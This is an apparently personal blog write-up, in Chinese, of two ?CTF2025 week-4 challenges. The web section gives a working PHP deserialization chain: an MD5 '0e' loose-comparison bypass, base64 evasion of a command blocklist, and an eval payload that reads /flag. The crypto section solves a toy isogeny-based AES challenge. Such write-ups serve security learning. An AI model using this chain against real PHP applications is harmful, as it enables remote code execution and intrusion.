{"title":"?CTF2025 week4部分WP","slug":"ilovectf week4 部分WP","date":"2025-10-31T16:00:00.000Z","updated":"2025-11-01T06:09:00.482Z","comments":true,"path":"api/articles/ilovectf week4 部分WP.json","photos":[],"excerpt":"打了?CTF2025,拿了第47，遗憾离场~","covers":["/images/week4_1.png"],"content":"<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Week4-Path-to-Hero\"><a href=\"#Week4-Path-to-Hero\" class=\"headerlink\" title=\"[Week4] Path to Hero\"></a>[Week4] Path to Hero</h3><hr>\n<p>题目描述：初出茅庐的勇者啊，你能战胜魔王，得到至宝吗？</p>\n<hr>\n<p>打开靶机，观察前端显示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php+HTML\">&lt;?php<br>highlight_file(&#x27;index.php&#x27;);<br><br>Class Start<br>&#123;<br>    public $ishero;<br>    public $adventure;<br><br><br>    public function __wakeup()&#123;<br><br>        if (strpos($this-&gt;ishero, &quot;hero&quot;) !== false &amp;&amp; $this-&gt;ishero !== &quot;hero&quot;) &#123;<br>            echo &quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;;<br><br>            return $this-&gt;adventure-&gt;sword;<br>        &#125;<br>        else&#123;<br>            echo &quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Sword\t\t//MD5弱类型比较<br>&#123;<br>    public $test1;<br>    public $test2;<br>    public $go;<br><br>    public function __get($name)<br>    &#123;<br>        if ($this-&gt;test1 !== $this-&gt;test2 &amp;&amp; md5($this-&gt;test1) == md5($this-&gt;test2)) &#123;<br>            echo &quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;;<br>            echo $this-&gt;go;<br>        &#125; else &#123;<br>            echo &quot;Dead&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Mon3tr<br>&#123;<br>    private $result;<br>    public $end;<br><br>    public function __toString()<br>    &#123;<br>        $result = new Treasure();<br>        echo &quot;到此为止了！魔王&lt;br&gt;&quot;;<br><br>        if (!preg_match(&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;, $this-&gt;end)) &#123;<br>            $result-&gt;end($this-&gt;end);<br>        &#125; else &#123;<br>            echo &quot;难道……要输了吗？&lt;br&gt;&quot;;<br>        &#125;<br>        return &quot;&lt;br&gt;&quot;;<br>    &#125;<br>&#125;<br><br>class Treasure<br>&#123;<br>    public function __call($name, $arg)<br>    &#123;<br>        echo &quot;结束了？&lt;br&gt;&quot;;<br>        eval($arg[0]);<br>    &#125;<br>&#125;<br><br>if (isset($_POST[&quot;HERO&quot;])) &#123;<br>    unserialize($_POST[&quot;HERO&quot;]);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>看到关键词<code>unserialize</code>以及魔术方法<code>_wakeup()、_toString()</code>得知，考察PHP的ROP链反序列化，</p>\n<p>第一个类<code>Start</code>，我们让<code>$adventrue</code>为一个<code>Sword</code>对象；</p>\n<p>第二个类<code>Sword</code>是典型的<strong>MD5弱类型比较(<code>==</code>比较哈希值)</strong>，我们只需让<code>$a = 240610708 &amp; $b = QNKCDZO</code>，MD5的值因为都以<code>0e</code>开头，被科学计数法处理为<code>0</code>，相等；</p>\n<p>第三个类<code>Mon3tr</code>考察<strong>黑名单绕过(正则过滤の绕过)</strong>，可以使用<code>base64编码</code>绕过；</p>\n<p>第四个类<code>Treasure</code>则考察<strong>RCE</strong>，任意代码执行。</p>\n<p>构造payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Start</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$ishero</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$adventure</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Sword</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$test1</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$test2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$go</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Mon3tr</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$end</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Treasure</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__call</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$name</span>, <span class=\"hljs-variable\">$arg</span></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$arg</span>[<span class=\"hljs-number\">0</span>]);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-variable\">$mon3tr</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Mon3tr</span>();<br><span class=\"hljs-variable\">$mon3tr</span>-&gt;end = <span class=\"hljs-string\">&quot;print_r(scandir(&#x27;/&#x27;));&quot;</span>;<br><span class=\"hljs-variable\">$sword</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Sword</span>();<br><span class=\"hljs-variable\">$sword</span>-&gt;test1 = <span class=\"hljs-string\">&quot;240610708&quot;</span>;<br><span class=\"hljs-variable\">$sword</span>-&gt;test2 = <span class=\"hljs-string\">&quot;QNKCDZO&quot;</span>;<br><span class=\"hljs-variable\">$sword</span>-&gt;go = <span class=\"hljs-variable\">$mon3tr</span>;<br><span class=\"hljs-variable\">$start</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Start</span>();<br><span class=\"hljs-variable\">$start</span>-&gt;ishero = <span class=\"hljs-string\">&quot;herox&quot;</span>;<br><span class=\"hljs-variable\">$start</span>-&gt;adventure = <span class=\"hljs-variable\">$sword</span>;<br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">urlencode</span>(<span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$start</span>));<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D</code></p>\n<p>先调用类似<code>ls /</code>命令查看文件夹，得到：</p>\n<p><img src=\"/images/week4_1.png\" alt=\"week4_1\"></p>\n<p>然后再用<code>eval()函数，再base64编码</code>，改<code>$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;</code>为<code>$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;</code>，执行php代码，得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D</code>，</p>\n<p>POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221}</p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"Week4-Myneighbors\"><a href=\"#Week4-Myneighbors\" class=\"headerlink\" title=\"[Week4] Myneighbors\"></a>[Week4] Myneighbors</h3><hr>\n<p>题目描述：我是我的邻居？<a href=\"https://eprint.iacr.org/2019/1321.pdf\">https://eprint.iacr.org/2019/1321.pdf</a></p>\n<hr>\n<p>题目代码为sagemath格式的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> secret <span class=\"hljs-keyword\">import</span> magical_num, flag<br><span class=\"hljs-keyword\">from</span> Crypto.Util.Padding <span class=\"hljs-keyword\">import</span> pad<br><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> Crypto.Cipher <span class=\"hljs-keyword\">import</span> AES<br><span class=\"hljs-keyword\">import</span> hashlib <br><br>p = <span class=\"hljs-number\">431</span><br>F.&lt;i&gt; = GF(p^<span class=\"hljs-number\">2</span>, modulus = x^<span class=\"hljs-number\">2</span> + <span class=\"hljs-number\">1</span>)<br>E = EllipticCurve(j=F(magical_num))<br><span class=\"hljs-keyword\">assert</span> E.is_supersingular()<br><br>P = E(<span class=\"hljs-number\">0</span>).division_points(<span class=\"hljs-number\">2</span>)[<span class=\"hljs-number\">1</span>:]<br>neighbors = []<br><span class=\"hljs-keyword\">for</span> idx <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">len</span>((P))):<br>    phi = E.isogeny(P[idx])<br>    EE = phi.codomain()<br>    neighbors.append(EE.j_invariant())<br><br><span class=\"hljs-keyword\">assert</span> E.j_invariant() <span class=\"hljs-keyword\">in</span> neighbors<br><br>P = E(<span class=\"hljs-number\">0</span>).division_points(<span class=\"hljs-number\">3</span>)[<span class=\"hljs-number\">1</span>:]<br>shuffle(P)<br><br>phi = E.isogeny(P[<span class=\"hljs-number\">0</span>])<br>E = phi.codomain()<br>H = hashlib.md5(<span class=\"hljs-built_in\">str</span>(E.j_invariant()).encode()).hexdigest().encode()<br>key, iv = H[:<span class=\"hljs-number\">16</span>], H[<span class=\"hljs-number\">16</span>:]<br><br>aes = AES.new(key, AES.MODE_CBC, iv)<br>cipher = aes.encrypt(pad(flag, <span class=\"hljs-number\">16</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&#x27;cipher: <span class=\"hljs-subst\">&#123;cipher.<span class=\"hljs-built_in\">hex</span>()&#125;</span>&#x27;</span>)<br><span class=\"hljs-comment\">#cipher: 49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0</span><br></code></pre></td></tr></table></figure>\n\n<p>可以看到<code>assert E.j_invariant() in neighbors</code>，E的<strong>j-invariant</strong>在自己的<strong>2-isogeny</strong>邻居中，</p>\n<p>同时，从题目给的文献里得知：</p>\n<ol>\n<li>在<code>2-isogeny</code>图中，每个<code>j-invariant</code>通常有<strong>3</strong>个邻居；</li>\n<li>特殊的<code>j-invariant</code>包括<code>p=431时，j 属于&#123;0, 2, 242&#125;</code>和<code>j=0&amp;&amp;j=242时，在图中有自环</code>。</li>\n</ol>\n<p>因此，我们的攻击思路为：</p>\n<ol>\n<li><code>magical_num</code>必须是有自环的；</li>\n<li>尝试<code>j 属于&#123;0, 242&#125;</code>;</li>\n<li>枚举所有可能的<code>3-isogeny</code>目标曲线；</li>\n<li>对<code>p=431</code>，每个曲线则有4个<code>3-isogeny</code>邻居。</li>\n</ol>\n<p>综上，EXP为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> Crypto.Cipher <span class=\"hljs-keyword\">import</span> AES<br><span class=\"hljs-keyword\">from</span> Crypto.Util.Padding <span class=\"hljs-keyword\">import</span> unpad<br><span class=\"hljs-keyword\">import</span> hashlib<br><br>p = <span class=\"hljs-number\">431</span><br>F.&lt;i&gt; = GF(p^<span class=\"hljs-number\">2</span>, modulus = x^<span class=\"hljs-number\">2</span> + <span class=\"hljs-number\">1</span>)<br><br>cipher_hex = <span class=\"hljs-string\">&#x27;49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0&#x27;</span><br>cipher = <span class=\"hljs-built_in\">bytes</span>.fromhex(cipher_hex)<br>candidates = [F(<span class=\"hljs-number\">0</span>), F(<span class=\"hljs-number\">4</span>), F(<span class=\"hljs-number\">242</span>)]<br><br><span class=\"hljs-keyword\">for</span> magical_num <span class=\"hljs-keyword\">in</span> candidates:<br>    <span class=\"hljs-keyword\">try</span>:<br>        E = EllipticCurve(j=magical_num)<br>        <br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> E.is_supersingular():<br>            <span class=\"hljs-keyword\">continue</span><br>            <br>        P = E(<span class=\"hljs-number\">0</span>).division_points(<span class=\"hljs-number\">2</span>)[<span class=\"hljs-number\">1</span>:]<br>        neighbors = []<br>        <span class=\"hljs-keyword\">for</span> idx <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">len</span>(P)):<br>            phi = E.isogeny(P[idx])<br>            EE = phi.codomain()<br>            neighbors.append(EE.j_invariant())<br>        <br>        <span class=\"hljs-keyword\">if</span> E.j_invariant() <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">in</span> neighbors:<br>            <span class=\"hljs-keyword\">continue</span><br>            <br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;Found magical_num: <span class=\"hljs-subst\">&#123;magical_num&#125;</span>&quot;</span>)<br>        <br>        P3 = E(<span class=\"hljs-number\">0</span>).division_points(<span class=\"hljs-number\">3</span>)[<span class=\"hljs-number\">1</span>:]<br>        <span class=\"hljs-keyword\">for</span> P_point <span class=\"hljs-keyword\">in</span> P3:<br>            <span class=\"hljs-keyword\">try</span>:<br>                phi = E.isogeny(P_point)<br>                E_new = phi.codomain()<br>                j_inv = E_new.j_invariant()<br>                H = hashlib.md5(<span class=\"hljs-built_in\">str</span>(j_inv).encode()).hexdigest().encode()<br>                key, iv = H[:<span class=\"hljs-number\">16</span>], H[<span class=\"hljs-number\">16</span>:]<br>                aes = AES.new(key, AES.MODE_CBC, iv)<br>                <span class=\"hljs-keyword\">try</span>:<br>                    plaintext = unpad(aes.decrypt(cipher), <span class=\"hljs-number\">16</span>)<br>                    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">b&#x27;flag&#123;&#x27;</span> <span class=\"hljs-keyword\">in</span> plaintext <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">b&#x27;FLAG&#123;&#x27;</span> <span class=\"hljs-keyword\">in</span> plaintext:<br>                        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;Success with j-invariant: <span class=\"hljs-subst\">&#123;j_inv&#125;</span>&quot;</span>)<br>                        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;Flag: <span class=\"hljs-subst\">&#123;plaintext.decode()&#125;</span>&quot;</span>)<br>                        exit()<br>                <span class=\"hljs-keyword\">except</span>:<br>                    <span class=\"hljs-keyword\">pass</span><br>            <span class=\"hljs-keyword\">except</span>:<br>                <span class=\"hljs-keyword\">pass</span><br>                <br>    <span class=\"hljs-keyword\">except</span> Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-keyword\">continue</span><br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Flag not found - trying all j-invariants from the paper...&quot;</span>)<br>all_j_invariants = [<br>    F(<span class=\"hljs-number\">0</span>), F(<span class=\"hljs-number\">4</span>), F(<span class=\"hljs-number\">316</span>), F(<span class=\"hljs-number\">107</span>), F(<span class=\"hljs-number\">419</span>), F(<span class=\"hljs-number\">234</span>), F(<span class=\"hljs-number\">102</span>), F(<span class=\"hljs-number\">241</span>), F(<span class=\"hljs-number\">143</span>), <br>    F(<span class=\"hljs-number\">358</span>), F(<span class=\"hljs-number\">125</span>), F(<span class=\"hljs-number\">19</span>), F(<span class=\"hljs-number\">242</span>), F(<span class=\"hljs-number\">61</span>), F(<span class=\"hljs-number\">381</span>), F(<span class=\"hljs-number\">319</span>), F(<span class=\"hljs-number\">356</span>), F(<span class=\"hljs-number\">150</span>), <br>    F(<span class=\"hljs-number\">422</span>), F(<span class=\"hljs-number\">67</span>), F(<span class=\"hljs-number\">189</span>),<br>    F(<span class=\"hljs-number\">81</span>*i + <span class=\"hljs-number\">65</span>), F(<span class=\"hljs-number\">67</span>*i + <span class=\"hljs-number\">304</span>), F(<span class=\"hljs-number\">350</span>*i + <span class=\"hljs-number\">65</span>), F(<span class=\"hljs-number\">132</span>*i + <span class=\"hljs-number\">315</span>), F(<span class=\"hljs-number\">125</span>*i + <span class=\"hljs-number\">426</span>),<br>    F(<span class=\"hljs-number\">306</span>*i + <span class=\"hljs-number\">426</span>), F(<span class=\"hljs-number\">299</span>*i + <span class=\"hljs-number\">315</span>), F(<span class=\"hljs-number\">325</span>*i + <span class=\"hljs-number\">379</span>), F(<span class=\"hljs-number\">222</span>*i + <span class=\"hljs-number\">118</span>), F(<span class=\"hljs-number\">106</span>*i + <span class=\"hljs-number\">379</span>),<br>    F(<span class=\"hljs-number\">42</span>*i + <span class=\"hljs-number\">141</span>), F(<span class=\"hljs-number\">209</span>*i + <span class=\"hljs-number\">118</span>), F(<span class=\"hljs-number\">389</span>*i + <span class=\"hljs-number\">141</span>), F(<span class=\"hljs-number\">364</span>*i + <span class=\"hljs-number\">304</span>), F(<span class=\"hljs-number\">344</span>*i + <span class=\"hljs-number\">190</span>),<br>    F(<span class=\"hljs-number\">87</span>*i + <span class=\"hljs-number\">190</span>)<br>]<br><br><span class=\"hljs-keyword\">for</span> j_inv <span class=\"hljs-keyword\">in</span> all_j_invariants:<br>    H = hashlib.md5(<span class=\"hljs-built_in\">str</span>(j_inv).encode()).hexdigest().encode()<br>    key, iv = H[:<span class=\"hljs-number\">16</span>], H[<span class=\"hljs-number\">16</span>:]<br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    <span class=\"hljs-keyword\">try</span>:<br>        plaintext = unpad(aes.decrypt(cipher), <span class=\"hljs-number\">16</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">b&#x27;flag&#123;&#x27;</span> <span class=\"hljs-keyword\">in</span> plaintext <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">b&#x27;FLAG&#123;&#x27;</span> <span class=\"hljs-keyword\">in</span> plaintext <span class=\"hljs-keyword\">or</span> plaintext.startswith(<span class=\"hljs-string\">b&#x27;flag&#x27;</span>) <span class=\"hljs-keyword\">or</span> plaintext.isascii():<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;Found with j-invariant: <span class=\"hljs-subst\">&#123;j_inv&#125;</span>&quot;</span>)<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;Flag: <span class=\"hljs-subst\">&#123;plaintext.decode()&#125;</span>&quot;</span>)<br>            <span class=\"hljs-keyword\">break</span><br>    <span class=\"hljs-keyword\">except</span>:<br>        <span class=\"hljs-keyword\">pass</span><br>    <br><span class=\"hljs-comment\">#flag：flag&#123;I_@m_4_n31gh80r_0f_my53lf&#125;</span><br></code></pre></td></tr></table></figure>\n\n<!--more-->","categories":[{"name":"CTF相关","slug":"CTF相关","count":9,"path":"api/categories/CTF相关.json"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","count":4,"path":"api/tags/比赛个人WP.json"}]}